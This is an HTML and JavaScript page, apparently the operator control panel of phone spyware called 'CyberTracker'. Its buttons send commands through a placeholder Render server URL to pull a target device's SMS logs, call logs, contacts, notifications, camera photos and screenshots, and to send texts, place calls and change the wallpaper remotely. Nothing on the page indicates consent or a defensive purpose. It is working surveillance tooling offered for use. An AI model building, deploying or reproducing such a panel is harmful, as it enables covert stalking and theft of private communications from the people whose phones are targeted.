<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberTracker Control Panel</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: #1a1a1a;
            color: #fff;
            padding: 20px;
        }
        h1 { color: #00ffcc; }
        .container {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 15px;
            margin-top: 20px;
        }
        button {
            background: #00ffcc;
            color: #1a1a1a;
            border: none;
            padding: 12px 18px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: 0.3s;
        }
        button:hover {
            background: #007a66;
            color: white;
        }
        #output {
            background: #333;
            color: #00ffcc;
            padding: 15px;
            margin-top: 20px;
            white-space: pre-wrap;
            border-radius: 5px;
            text-align: left;
            max-width: 80%;
            margin: auto;
        }
    </style>
</head>
<body>
    <h1>CyberTracker - Remote Control Panel</h1>
    <div class="container">
        <button onclick="sendCommand('fetch_device_info')">ğŸ“± Fetch Device Info</button>
        <button onclick="sendCommand('fetch_sms_logs')">ğŸ“© View SMS Logs</button>
        <button onclick="sendCommand('fetch_call_logs')">ğŸ“ View Call Logs</button>
        <button onclick="sendCommand('fetch_contacts')">ğŸ“– View Contacts</button>
        <button onclick="sendCommand('fetch_notifications')">ğŸ”” View Notifications</button>
        <button onclick="sendCommand('capture_photo')">ğŸ“· Capture Photo</button>
        <button onclick="sendCommand('take_screenshot')">ğŸ–¥ Capture Screenshot</button>
        <button onclick="sendSMS()">ğŸ“¤ Send SMS</button>
        <button onclick="makeCall()">ğŸ“² Make Call</button>
        <button onclick="changeWallpaper()">ğŸ–¼ Change Wallpaper</button>
    </div>
    
    <h2>ğŸ“‹ Output</h2>
    <div id="output">Click a button to see results...</div>

    <script>
        const SERVER_URL = "https://your-app.onrender.com"; // Replace with your actual Render URL

        async function sendCommand(action, params = {}) {
            try {
                let response = await fetch(SERVER_URL + "/send_command", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ action, params })
                });

                let data = await response.json();
                
                // Check if data contains actual content
                if (!data.data || data.data === "No Data Available") {
                    document.getElementById("output").innerText = "âŒ No data received!";
                    return;
                }

                // Handle different types of data
                if (typeof data.data === "string") {
                    if (data.data.startsWith("http")) {
                        // If data is a URL, provide a clickable link
                        document.getElementById("output").innerHTML = 
                            `âœ… Data Received: <a href="${data.data}" target="_blank">View File</a>`;
                    } else {
                        // Otherwise, show the text response
                        document.getElementById("output").innerText = `âœ… Data Received:\n${data.data}`;
                    }
                } else {
                    // Show JSON data
                    document.getElementById("output").innerText = JSON.stringify(data, null, 2);
                }

            } catch (error) {
                console.error("Error:", error);
                document.getElementById("output").innerText = "âŒ Error connecting to the server!";
            }
        }

        function sendSMS() {
            let number = prompt("Enter Phone Number:");
            let message = prompt("Enter Message:");
            if (number && message) {
                sendCommand("send_sms", { number, message });
            } else {
                alert("âŒ Phone Number and Message are required!");
            }
        }

        function makeCall() {
            let number = prompt("Enter Phone Number:");
            if (number) {
                sendCommand("make_call", { number });
            } else {
                alert("âŒ Phone Number is required!");
            }
        }

        function changeWallpaper() {
            let imageUrl = prompt("Enter Image URL:");
            if (imageUrl) {
                sendCommand("change_wallpaper", { url: imageUrl });
            } else {
                alert("âŒ Image URL is required!");
            }
        }
    </script>
</body>
</html>
